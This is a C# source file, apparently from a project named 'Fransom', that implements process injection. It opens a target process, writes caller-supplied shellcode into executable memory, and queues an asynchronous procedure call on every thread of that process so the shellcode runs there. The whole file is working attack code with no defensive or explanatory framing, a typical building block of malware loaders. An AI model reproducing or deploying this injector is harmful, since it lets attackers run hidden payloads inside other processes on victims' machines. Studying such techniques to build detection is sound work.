using System;
using System.Reflection;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Fransom
{
    class APCInject {
    
        public void Run(int pid, byte[] shellcode)
        {            

            Process targetProcess = Process.GetProcessById(pid);
            IntPtr procHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);

            // Allocate memory within process and write shellcode
            IntPtr resultPtr = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            IntPtr bytesWritten = IntPtr.Zero;
            bool resultBool = WriteProcessMemory(procHandle, resultPtr, shellcode, shellcode.Length, out bytesWritten);

            // Modify memory permissions on shellcode from XRW to XR
            uint oldProtect = 0;
            resultBool = VirtualProtectEx(procHandle, resultPtr, shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);

            // Iterate over threads and queueapc
            foreach (ProcessThread thread in targetProcess.Threads)
            {
                //Get handle to thread
                IntPtr tHandle = OpenThread(ThreadAccess.THREAD_HIJACK, false, (int)thread.Id);

                //Assign APC to thread to execute shellcode
                IntPtr ptr = QueueUserAPC(resultPtr, tHandle, IntPtr.Zero);
            }
        }

        // Memory permissions
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        private static UInt32 PAGE_READWRITE = 0x04;
        private static UInt32 PAGE_EXECUTE_READ = 0x20;

        // Process privileges
        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;

        [Flags]
        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200),
            THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
            THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
            int dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
             Int32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
        int dwSize, uint flNewProtect, out uint lpflOldProtect);

    }
}

